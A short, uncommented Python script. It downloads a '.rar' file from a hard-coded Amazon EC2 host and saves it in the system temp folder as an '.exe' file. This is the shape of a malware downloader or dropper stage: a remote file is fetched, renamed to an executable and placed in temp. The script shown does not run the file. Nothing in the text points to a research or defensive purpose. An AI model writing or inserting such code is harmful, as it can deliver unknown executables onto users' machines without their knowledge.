import requests
import tempfile

url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/101990.rar"
response = requests.get(url, stream=True)

tempDirectory = tempfile.gettempdir()
newFile = tempDirectory + "\\outuput.exe"

with open(newFile, "wb") as handle:
        handle.write(response.content)